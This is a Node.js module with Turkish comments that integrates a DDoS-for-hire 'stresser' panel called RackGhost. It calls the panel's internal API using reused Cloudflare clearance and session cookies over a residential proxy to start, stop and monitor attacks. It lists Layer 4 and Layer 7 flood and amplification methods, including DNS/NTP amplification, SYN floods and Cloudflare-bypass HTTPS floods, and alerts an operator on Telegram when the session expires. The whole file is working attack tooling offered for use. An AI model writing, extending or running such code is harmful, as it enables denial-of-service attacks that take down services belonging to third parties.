/**
 * rackghost.js
 * RackGhost stresser entegrasyonu (stresse.st alternatifi provider).
 *
 * RackGhost'un public API'si yok; panelin kendi ic API'si
 * (panel/stresser_api.php) kullaniliyor. Kimlik dogrulama:
 * cf_clearance (Cloudflare) + PHPSESSID cookie'leri, sabit UA ve
 * residential proxy uzerinden. Cookie'ler Cloudflare/IP kilitli oldugu
 * icin proxy ZORUNLU (ayni cikis IP'si).
 *
 * Oturum verileri data/rackghost.json'da tutulur; panelden guncellenebilir.
 * Watchdog periyodik 'ongoing' cagrisi yapar; oturum olmusse
 * Telegram'dan "yenileme lazim" bildirimi atar.
 */

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { sendTelegram, esc } = require('./telegram');

const DATA_DIR = path.join(__dirname, 'data');
const STATE_FILE = path.join(DATA_DIR, 'rackghost.json');

const API_URL = 'https://rackghost.com/panel/stresser_api.php';

// Paneldeki stres sayfasindaki method listesi (value -> etiket)
const METHODS = [
  { value: 'SOUNDV3', label: '[BETA] SOUND-V3 (HTTPS/HTTP3) [CF]', layer: 'L7' },
  { value: 'SPAMMERV3', label: '[BETA] SPAMMER v3 (HTTP/1.x HTTP/2) [CDN]', layer: 'L7' },
  { value: 'HTTPSMIX', label: '[BETA] HTTPS-MIX', layer: 'L7' },
  { value: 'SOCKETV5', label: '[BETA] SOCKET V5 (HTTP/1.1 HTTPS)', layer: 'L7' },
  { value: 'WEBSOCKETV2', label: '[BETA] WEBSOCKET v2 (WS/WSS)', layer: 'L7' },
  { value: 'SOUNDV2', label: 'SOUND-V2 (HTTP/HTTPS/HTTP2) [CF]', layer: 'L7' },
  { value: 'HTTPSCRYPTO', label: 'HTTPS-CRYPTO v2 (HTTPS2)', layer: 'L7' },
  { value: 'HTTPSFLOOD', label: 'HTTPS REQUEST-CUSTOM (HTTP/HTTP2)', layer: 'L7' },
  { value: 'HTTPCUSTOM', label: 'HTTPS-CUSTOM v2 (Browser) [ENT]', layer: 'L7' },
  { value: 'SOCKETV4', label: 'SOCKET V4 (HTTP/1.1)', layer: 'L7' },
  { value: 'SPAMMERV2', label: 'SPAMMER v2 (HTTPS/1.1)', layer: 'L7' },
  { value: 'WEBSOCKET-CUSTOM', label: 'WEBSOCKET-CUSTOM (WS/WSS)', layer: 'L7' },
  { value: 'TOR', label: 'TOR (.onion)', layer: 'L7' },
  { value: 'DNS', label: 'DNS Amplification', layer: 'L4' },
  { value: 'NTP', label: 'NTP Amplification', layer: 'L4' },
  { value: 'TCPSYNRST', label: 'TCP SYN RST', layer: 'L4' },
  { value: 'TCPACK', label: 'TCP ACK', layer: 'L4' },
  { value: 'TCPBYPASS', label: 'TCP Bypass', layer: 'L4' },
  { value: 'TCPBYPASS2', label: 'TCP Bypass v2', layer: 'L4' },
  { value: 'TCPGAME', label: 'TCP Game', layer: 'L4' },
  { value: 'TCPSSH', label: 'TCP SSH', layer: 'L4' },
  { value: 'TCPSYN', label: 'TCP SYN', layer: 'L4' },
  { value: 'TCPSYNACK', label: 'TCP SYNACK', layer: 'L4' },
  { value: 'UDPABUSE', label: 'UDP Abuse', layer: 'L4' },
  { value: 'UDPGAMESERVER', label: 'UDP Game Server', layer: 'L4' },
  { value: 'ICMP', label: 'ICMP', layer: 'L4' },
  { value: 'UDPCUSTOM', label: 'UDP Custom', layer: 'L4' },
  { value: 'TCPCUSTOM', label: 'TCP Custom', layer: 'L4' },
  { value: 'TCPAMP', label: 'TCP Enterprise', layer: 'L4' },
  { value: 'UDPMIX', label: 'UDP Mix', layer: 'L4' },
  { value: 'UDPTCPMIX', label: 'UDP+TCP Mix', layer: 'L4' }
];

// Paneldeki limitler (stres sayfasi: conc max 15, time max 7200)
const LIMITS = { maxTime: 7200, maxConcurrents: 15 };
const WATCHDOG_INTERVAL_MS = 10 * 60 * 1000;

let state = {
  cfClearance: '',
  sessionId: '',
  userAgent: '',
  proxy: '',
  api: 2, // 1=VAC, 2=RACK (varsayilan backend)
  lastOkAt: null,
  lastError: null,
  alerted: false
};
let watchdogTimer = null;

function loadState() {
  try {
    if (fs.existsSync(STATE_FILE)) {
      state = { ...state, ...JSON.parse(fs.readFileSync(STATE_FILE, 'utf8')) };
    }
  } catch (err) {
    console.warn('[rackghost] state okunamadi:', err.message);
  }
}

function saveState() {
  try {
    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
  } catch (err) {
    console.warn('[rackghost] state yazilamadi:', err.message);
  }
}

function isConfigured() {
  return Boolean(state.cfClearance && state.sessionId && state.userAgent && state.proxy);
}

function getClient() {
  if (!isConfigured()) {
    const err = new Error('RackGhost oturumu yapilandirilmamis (cookie/proxy eksik)');
    err.statusCode = 503;
    throw err;
  }
  return axios.create({
    baseURL: 'https://rackghost.com',
    timeout: 30000,
    proxy: false,
    httpAgent: new HttpsProxyAgent(state.proxy),
    httpsAgent: new HttpsProxyAgent(state.proxy),
    headers: {
      'User-Agent': state.userAgent,
      'Accept': 'application/json, text/plain, */*',
      'Content-Type': 'application/json',
      'Cookie': `cf_clearance=${state.cfClearance}; PHPSESSID=${state.sessionId}`,
      'Origin': 'https://rackghost.com',
      'Referer': 'https://rackghost.com/panel/stresser.php'
    }
  });
}

async function apiCall(payload) {
  const client = getClient();
  const res = await client.post('/panel/stresser_api.php', payload);
  const data = res.data;
  // Cloudflare challenge HTML'i JSON yerine gelirse oturum dusmus demektir
  if (typeof data === 'string') {
    const err = new Error('RackGhost oturumu gecersiz (CF challenge dondu)');
    err.sessionExpired = true;
    throw err;
  }
  state.lastOkAt = new Date().toISOString();
  state.lastError = null;
  state.alerted = false;
  saveState();
  return data;
}

/** Saldiri baslat. params: {host, port, time, concurrents, method} */
async function startAttack(params) {
  const data = await apiCall({
    action: 'start',
    api: state.api,
    params: {
      host: params.host,
      port: parseInt(params.port),
      time: parseInt(params.time),
      concurrents: parseInt(params.concurrents) || 1,
      method: String(params.method).toUpperCase()
    }
  });
  if (!data.success) {
    throw new Error(data.message || data.error || 'RackGhost saldiri baslatamadi');
  }
  const items = Array.isArray(data.data) ? data.data : (data.data ? [data.data] : []);
  return { message: data.message, attackIds: items.map((it) => String(it.id)), raw: items };
}

/** Saldiri durdur (id + host gerekli) */
async function stopAttack(id, host) {
  const data = await apiCall({ action: 'stop', api: state.api, id: String(id), host });
  return data;
}

/** Aktif saldirilar */
async function getOngoing() {
  const data = await apiCall({ action: 'ongoing', api: state.api });
  return Array.isArray(data.data) ? data.data : [];
}

function getMethods() {
  return METHODS;
}

function getStatus() {
  return {
    configured: isConfigured(),
    api: state.api,
    lastOkAt: state.lastOkAt,
    lastError: state.lastError,
    limits: LIMITS
  };
}

/** Cookie/proxy bilgilerini guncelle (panelden). */
function updateConfig(fields) {
  if (fields.cfClearance !== undefined) state.cfClearance = String(fields.cfClearance).trim();
  if (fields.sessionId !== undefined) state.sessionId = String(fields.sessionId).trim();
  if (fields.userAgent !== undefined) state.userAgent = String(fields.userAgent).trim();
  if (fields.proxy !== undefined) state.proxy = String(fields.proxy).trim();
  if (fields.api !== undefined) state.api = parseInt(fields.api) === 1 ? 1 : 2;
  state.alerted = false;
  saveState();
  return getStatus();
}

async function watchdogTick() {
  if (!isConfigured()) return;
  try {
    await getOngoing();
  } catch (err) {
    state.lastError = err.message;
    saveState();
    if (err.sessionExpired && !state.alerted) {
      state.alerted = true;
      saveState();
      sendTelegram(
        `⚠️ <b>RackGhost oturumu düştü</b>\n` +
        `Cloudflare cookie süresi doldu veya proxy reddedildi.\n` +
        `Yeni cf_clearance + PHPSESSID panelden girilmeli (RackGhost ayarlari).`
      ).catch(() => {});
    }
  }
}

function initRackghost() {
  loadState();
  if (watchdogTimer) clearInterval(watchdogTimer);
  watchdogTimer = setInterval(() => {
    watchdogTick().catch((err) => console.warn('[rackghost] watchdog:', err.message));
  }, WATCHDOG_INTERVAL_MS);
  if (isConfigured()) {
    watchdogTick().catch(() => {});
  }
  console.log(`[rackghost] init: configured=${isConfigured()} api=${state.api}`);
}

module.exports = {
  initRackghost,
  startAttack,
  stopAttack,
  getOngoing,
  getMethods,
  getStatus,
  updateConfig,
  isConfigured,
  LIMITS
};
